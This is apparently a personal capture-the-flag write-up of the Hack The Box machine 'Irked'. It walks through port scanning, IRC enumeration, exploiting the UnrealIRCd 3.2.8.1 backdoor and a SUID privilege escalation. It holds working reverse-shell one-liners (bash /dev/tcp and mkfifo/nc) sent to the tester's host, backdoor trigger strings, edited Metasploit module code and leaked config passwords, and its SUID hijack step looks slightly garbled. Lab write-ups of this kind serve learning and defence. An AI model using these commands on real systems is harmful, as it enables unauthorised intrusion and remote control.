+++
date = '2026-06-02T22:49:13-04:00'
title = 'Irked'
tags = ["htb", "easy", "metasploit","fixing exploits","repeat"]
+++

``` IP
10.129.8.83
```
# OS: 
# Credentials:

| Username | Password | Notes/Hash |
| -------- | -------- | ---------- |

---
# `nmap` results:
 ```
 # Nmap 7.99 scan initiated Tue Jun  2 14:06:31 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/Irked 10.129.8.83
Nmap scan report for 10.129.8.72
Host is up, received echo-reply ttl 63 (0.018s latency).
Scanned at 2026-06-02 14:06:32 EDT for 26s
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI+wKAAyWgx/P7Pe78y6/80XVTd6QEv6t5ZIpdzKvS8qbkChLB7LC+/HVuxLshOUtac4oHr/IF9YBytBoaAte87fxF45o3HS9MflMA4511KTeNwc5QuhdHzqXX9ne0ypBAgFKECBUJqJ23Lp2S9KuYEYLzUhSdUEYqiZlcc65NspAAAAFQDwgf5Wh8QRu3zSvOIXTk+5g0eTKQAAAIBQuTzKnX3nNfflt++gnjAJ/dIRXW/KMPTNOSo730gLxMWVeId3geXDkiNCD/zo5XgMIQAWDXS+0t0hlsH1BfrDzeEbGSgYNpXoz42RSHKtx7pYLG/hbUr4836olHrxLkjXCFuYFo9fCDs2/QsAeuhCPgEDjLXItW9ibfFqLxyP2QAAAIAE5MCdrGmT8huPIxPI+bQWeQyKQI/lH32FDZb4xJBPrrqlk9wKWOa1fU2JZM0nrOkdnCPIjLeq9+Db5WyZU2u3rdU8aWLZy8zF9mXZxuW/T3yXAV5whYa4QwqaVaiEzjcgRouex0ev/u+y5vlIf4/SfAsiFQPzYKomDiBtByS9XA==
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDGASnp9kH4PwWZHx/V3aJjxLzjpiqc2FOyppTFp7/JFKcB9otDhh5kWgSrVDVijdsK95KcsEKC/R+HJ9/P0KPdf4hDvjJXB1H3Th5/83gy/TEJTDJG16zXtyR9lPdBYg4n5hhfFWO1PxM9m41XlEuNgiSYOr+uuEeLxzJb6ccq0VMnSvBd88FGnwpEoH1JYZyyTnnbwtBrXSz1tR5ZocJXU4DmI9pzTNkGFT+Q/K6V/sdF73KmMecatgcprIENgmVSaiKh9mb+4vEfWLIe0yZ97c2EdzF5255BalP3xHFAY0jROiBnUDSDlxyWMIcSymZPuE1N6Tu8nQ/pXxKvUar
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFeZigS1PimiXXJSqDy2KTT4UEEphoLAk8/ftEXUq0ihDOFDrpgT0Y4vYgYPXboLlPBKBc0nVBmKD+6pvSwIEy8=
|   256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC6m+0iYo68rwVQDYDejkVvsvg22D8MN+bNWMUEOWrhj
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39984/tcp   status
|   100024  1          44276/tcp6  status
|   100024  1          45006/udp   status
|_  100024  1          53318/udp6  status
6697/tcp  open  irc     syn-ack ttl 63 UnrealIRCd
8067/tcp  open  irc     syn-ack ttl 63 UnrealIRCd
39984/tcp open  status  syn-ack ttl 63 1 (RPC #100024)
65534/tcp open  irc     syn-ack ttl 63 UnrealIRCd
 ```

---
# Attack + Enum Vectors
TCP 111: RPCBind?
TCP 80: HTTP Apache httpd 2.4.10 

TCP 22: OpenSSH 6.7p1

Unknown:
- TCP 6697: irc?
- TCP 8067: irc?
- TCP 65534: irc?
- TCP 39984: rpc status?

## UDP (161 SNMP)?
UDP 161: SNMP closed

---
# Service Enum Notes:
RPCBind: yields nothing interesting trying the enumeration methodology from: https://hackviser.com/tactics/pentesting/services/rpcbind

### Web Service: `Gobuster` / `fuff`
going to:
```
http://10.129.8.83/
```
showed an `irked.jpeg` image of a mad looking person

and text, in bold:
```
**IRC is almost working!**
```

### IRC Enumeartion
Well let's do some enumeration on `IRC`? since we saw some weird ports of nmap saying `irc`. Researching on google we found:
https://hackviser.com/tactics/pentesting/services/irc

Ok the default should be `6667`  appearantly? but we have a similar number at `6697`; let's try doing that. First we install `irssi` with
```
sudo apt install irssi
```
and using `man irssi` we saw we can specify port with `-p`:
```
irssi -c 10.129.8.83 -p 6697
```
and we logged in? 
```
/nick pentester
```
```
/user pentester localhost localhost :Pentester
```
now let's try to enumerate things
```
/list
```
```
/names
```
```
/whois
```
returned nothing interesting...

on hacktricks they showed more ways we can enumerate:
https://hacktricks.wiki/en/network-services-pentesting/pentesting-irc.html

Now we add a `/` infront of the commands (or `/help` also show commands we can enumerate with in `irssi`)
```
/admin
```
```
14:51 -!- Administrative info about irked.htb
14:51 -!- Bob Smith
14:51 -!- bob
14:51 -!- widely@used.name
```
so it shows the time and some information? We got the a name Bob and his last name Smith?
```
/info
```
```
15:05 -!- =-=-=-= Unreal3.2.8.1 =-=-=-=
15:05 -!- | This release was brought to you by the following people:
15:05 -!- |
15:05 -!- | Coders:
15:05 -!- | * Syzop        <syzop@unrealircd.com>
15:05 -!- |
15:05 -!- | Contributors:
15:05 -!- | * aquanight    <aquanight@unrealircd.com>
15:05 -!- | * WolfSage     <wolfsage@unrealircd.com>
15:05 -!- | * Stealth, tabrisnet, Bock, fbi
15:05 -!- |
15:05 -!- | RC Testers:
15:05 -!- | * Bock, Apocalypse, StrawberryKittens, wax, Elemental,
15:05 -!- |   Golden|Wolf, and everyone else who tested the RC's
15:05 -!- |
15:05 -!- | Past UnrealIRCd3.2* coders/contributors:
15:05 -!- | * Stskeeps (ret. head coder / project leader)
15:05 -!- | * codemastr (ret. u3.2 head coder)
15:05 -!- | * McSkaf, Zogg, NiQuiL, chasm, llthangel, nighthawk, ..
15:05 -!- |
15:05 -!- |
15:05 -!- | Credits - Type /Credits
15:05 -!- | DALnet Credits - Type /DalInfo
15:05 -!- |
15:05 -!- | This is an UnrealIRCd-style server
15:05 -!- | If you find any bugs, please report them at:
15:05 -!- |  http://bugs.unrealircd.org/
15:05 -!- | UnrealIRCd Homepage: http://www.unrealircd.com
15:05 -!- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

---
# Initial Foothold
So we found `UnrealIRCd 3.2.8.1` as version number, let's see if there are exploits
```
searchsploit unreal 3.2.8.1
```
appearantly there is an exploit on metasploit? I haven't used this in a while so good time to practice after OSCP: let's run metasploit
```
msfconsole
```
```
use unrealirc
```
then shows searched results:
```
use 0
```
```
show options
```
```
set rhosts 10.129.8.83
```
```
set rport 6697
```
```
set lhost HTB_VPN_IP
```
```
exploit
```
some how didn't work... Not sure if I am on the right track, but let me research on other similar exploits and I will come back to metasploit later

I went on google and searched 
```
unrealircd 3.2.8.1 exploit site:github.com
```
then found this python script:
https://github.com/kevinpdicks/UnrealIRCD-3.2.8.1-RCE/blob/main/exploit.py

first set up listener:
```
sudo nc -lvnp 80
```
and using the script
```
python3 exploit.py 10.129.8.83 6697 HTB_VPN_IP 80
```
waiting for about 20 seconds we got a reverse shell back!

Now upgrading the shell:
```
which python3
```
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
export TERM=xterm
```
then `Ctrl + Z` to background the process:
```
stty raw -echo;fg
```
```
reset
```
then enter my rows and columns for my `tmux`
```
stty rows 48 cols 210
```
we got a fully upgraded stabilized shell

---
# Priv Esc
So we are in the `Unreal3.2` directory: searching google on `UnrealIRC config file`: and we know the config file is `unrealircd.conf`
```
cat unrealircd.conf | grep -i "pass"
```
we got a few password looking passes, let's save them:
```
password "f00Ness";
```
```
password "f00";
```
```
password        moocowsrulemyworld;
```
spraying them on trying to log in as the other user `djmardov` and `root` we failed; but it's good to note down these passwords see if we need them later

Enumerate suid bits:
```
find / -perm -u=s -type f 2>/dev/null
```
we see something odd:
```
/usr/bin/viewuser
```
interesting, let's run it to see what it does
```
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2026-06-02 15:02 (:0)
sh: 1: /tmp/listusers: not found
```
so it's running `/tmp/listusers`?
```
ls -lah /usr/bin/viewuser
-rwsr-xr-x 1 root root 7.2K May 16  2018 /usr/bin/viewuser
```
we see that the owner is root, so if we run it it will be executing as root, let's hijack `/tmp/listusers` and see if we can get privilege escalation then
```
nano /tmp/listusers
```
```
#!/bin/bash
chmod +x /bin/bash
```
then let's do:
```
/bin/bash -p
```
We got root shell!

Therefore pwn'd

---
# Conclusion & Remediation
In this box we get to learn about how to enumerate `IRC` and using exploits to gain reverse shell. Lastly, since there is a misconfigured SUID bit program we get to abuse it and obtain root.

To remediate, system administrators should upgrade their outdated `UnrealIRCd` to the newest version. If cannot update, at least prevent any user from executing the `/info` command to gett the version banner. In addition, there shouldn't be any SUID programs that is owned by root to execute a program in `/tmp` that has not been created.
### Other Resources for the box
https://0xdf.gitlab.io/2019/04/27/htb-irked.html
https://www.youtube.com/watch?v=OGFTM_qvtVI
### More Digging: Debug Metasploit
Let's try to go back to metasploit and see why our exploit didn't work
```
msfconsole
```
```
use unrealirc
```
then using showed search results:
```
use 0
```
```
show options
```
```
set rhosts 10.129.8.83
```
```
set rport 6697
```
```
set lhost HTB_VPN_IP
```
```
exploit
```
didn't work like before too, okay why didn't it work? I also tried different target `rport`, I think the issue might mainly came from the shell payload it's using?
```
show options
```
shows that we are using
```
Payload options (cmd/linux/http/x86/meterpreter/reverse_tcp):
```
by default, I think it's over http by the name? Let's see more details
```
info
```
shows:
```
Platform: Unix, Linux                            
Arch: cmd
```
Let's find payloads with `unix` and `cmd` tag
```
show payloads
```

I got stuck here for a couple of hours and can't seem to get it work: then I thought of analyzing the code used by metasploit. Going online and searching didn't yield good results too, so I am going to have to try to fix this myself, on metasploit: (I re-opened `metasploit` everytime, I believe metasploit saves the codes to RAM everytime)
```
edit
```
Scrolling down to the very bottom we see this code:
```
sock.put("AB;" + payload.encoded + "\n")
```
I tried to deletee the `\n`:
```
sock.put("AB;" + payload.encoded)
```
didn't work.
```
sock.put("AB; bash -c 'bash -i >& /dev/tcp/HTB_VPN_IP/1337 0>&1'")
```
hmmm didn't seem to work. Let's try exploiting it manually with the code
```
echo "AB; bash -c 'bash -i >& /dev/tcp/HTB_VPN_IP/1337 0>&1'" | nc 10.129.8.83 6697
```
ok so this worked.

Hmmm now let's try to **replace** the similar code to ruby terms (I backed up the original code so I can recover it later); searching on google we know we can execute a shell command with `system("command")`. 
I want to run my own catcher to confirm:
```
set DisablePayloadHandler true
```
Using a `base64` encoded command and running it with metasploit.... oh it worked!
```
system("echo 'AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc HTB_VPN_IP 1337 >/tmp/f' | nc 10.129.8.83 6697")
```

I am guessing there's some compatibility errors or issues with the `sock.put`? Not so sure since I am not super familiar with `ruby`. Nonetheless, I found why the exploit wasn't working.

Then editing it to:
```
system("echo 'AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc #{lhost} #{lport} >/tmp/f' | nc #{rhost} #{port}")
```
```
run
```
again we got it working!

Now i want to try to fix it to something that could work auto handlers, let's combine the same as what the author of the exploit original wrote and see if we can stick to it
```
system("echo 'AB; #{payload.encoded}' | nc #{rhost} #{rport}")
```
Okay so this works, but with a little caveat: we have to use the default shell 
```
set payload cmd/linux/http/x86/meterpreter/reverse_tcp
```
and since the target doesn't actually have `curl` installed, we have to use `wget`
```
set fetch_command wget
```
then this will work: BUT except after we caught the shell, we have to re-initiate it by `Ctrl + C` after we got meterpreter shell, then `sessions [session id]`. Well, in the end we did "fix" the exploit. Seems like there's more learning to do if I want to fix this exploit. I will leave that to the future me.
